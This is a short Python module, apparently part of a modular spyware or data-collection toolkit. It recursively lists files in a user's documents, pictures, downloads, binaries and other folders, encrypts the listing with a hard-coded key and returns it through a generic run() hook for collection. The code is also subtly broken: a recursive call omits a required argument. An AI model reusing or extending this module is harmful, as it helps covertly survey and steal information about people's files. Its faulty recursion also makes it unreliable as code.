#!/usr/bin/python
# from gi.repository import GLib
# downloads_dir = GLib.get_user_special_dir(GLib.UserDirectory.DIRECTORY_DOWNLOAD)
import os
import common

custom_paths = ["/home/pawel/custom_folder"]
special_paths = ["DOC","MUS","PIC","DWNLD","VID","BIN","NET"]
module_name = "fl_lister module"
key = "XdFcxQRnJIIoLkRW"


def update_result(root, dirs, files, result):
    result += "[*] {0}\n".format(root)
    for file in files:
        result += "\t--> {0}\n".format(file)
    for dir in dirs:
        for sub_root, sub_dirs, sub_files in os.walk(root + dir):
            result += update_result(sub_root, sub_dirs, sub_files)
    return result


def save_file_data():
    result = common.fill_line()
    for path in common.get_paths(custom_paths, special_paths):
        for root, dirs, files in os.walk(path):
            result = update_result(root, dirs, files, result)
    result += common.fill_line()
    return common.get_module_info(module_name), common.encrypt_word_with_key(result, key)

#application
def run(*args):
    return save_file_data()